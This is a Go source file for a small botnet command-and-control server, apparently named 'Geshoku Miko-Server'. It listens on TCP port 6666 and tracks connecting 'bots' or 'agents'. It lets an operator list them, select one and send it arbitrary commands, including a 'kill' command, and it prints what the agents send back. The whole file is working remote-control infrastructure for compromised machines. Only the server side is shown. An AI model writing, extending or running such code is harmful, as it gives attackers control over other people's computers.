package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"strings"
	"sync"
)

// Globals and defines
type Bot struct {
	ID      string
	Conn    net.Conn
	Version string
}

var agent_list = make(map[string]Bot)
var lock = &sync.Mutex{}
var bot_version = "0.0.1"

func write_welcome() {
	fmt.Println("-----------Geshoku------------")
	fmt.Println("--------Miko-Server-----------")
	fmt.Println("------Version 0.001 Alpha-----")
	fmt.Println("------------------------------")
}

func list_agents() {
	lock.Lock()
	defer lock.Unlock()

	if len(agent_list) == 0 {
		fmt.Println("[Info] No agents connected")
		return
	}
	fmt.Println("[Info] Agents connected:")
	for id, bot := range agent_list {
		fmt.Printf("ID: %s, Version: %s\n", id, bot.Version)
	}
}

func agent_interact(agentID string) {
	lock.Lock()
	bot, exists := agent_list[agentID]
	lock.Unlock()

	if !exists {
		fmt.Println("[Err] Agent not found")
		return
	}
	reader := bufio.NewReader(os.Stdin)
	for {
		fmt.Printf("(%s) Command> ", agentID)
		command, _ := reader.ReadString('\n')
		command = strings.TrimSpace(command)

		if command == "exit" {
			fmt.Printf("[Info] Exiting interaction mode\n")
			return
		}

		_, err := bot.Conn.Write([]byte(command))
		if err != nil {
			fmt.Printf("[Err] Failed to send command to %s: %v\n", agentID, err)
		}
		if command == "kill" {
			return
		}
	}
}

func handle_command(command string) {
	switch {
	case strings.HasPrefix(command, "select"):
		parts := strings.Split(command, " ")
		if len(parts) < 2 {
			fmt.Printf("[Error] Usage: interact <agent_id>\n")
			return
		}
		agentID := parts[1]
		agent_interact(agentID)
	case command == "list":
		list_agents()
	case command == "exit":
		fmt.Print("Exiting...")
		os.Exit(0)
	default:
		fmt.Printf("[Err] Wrong command\n")
	}
}

func handle_client(conn net.Conn) {
	defer conn.Close()
	buffer := make([]byte, 1024)
	bot := Bot{
		ID:      conn.RemoteAddr().String(),
		Conn:    conn,
		Version: bot_version,
	}
	lock.Lock()
	agent_list[bot.ID] = bot
	lock.Unlock()
	fmt.Printf("\r")
	fmt.Printf("\n[Info] New agent connected: %s\n", bot.ID)
	for {
		//buffer = buffer[:0]
		_, err := conn.Read(buffer)
		if err != nil {
			fmt.Println("[Info] Agent disconnected")
			lock.Lock()
			delete(agent_list, bot.ID)
			lock.Unlock()
			return

		}
		fmt.Printf("[Info] %s : %s\n", bot.ID, buffer)
		fmt.Print("Command>")
	}
}

func start_server() {
	listener, err := net.Listen("tcp", ":6666")
	if err != nil {
		fmt.Println("[Err] Server start failed: ", err)
		return
	}
	for {
		conn, err := listener.Accept()
		if err != nil {
			fmt.Println("[Err] Connection accept failed: ", err)
			continue
		}
		go handle_client(conn)
	}
}

func main() {
	write_welcome()
	go start_server()
	for {
		reader := bufio.NewReader(os.Stdin)
		fmt.Print("Command> ")
		command, _ := reader.ReadString('\n')
		command = strings.TrimSpace(command)

		handle_command(command)
	}
}
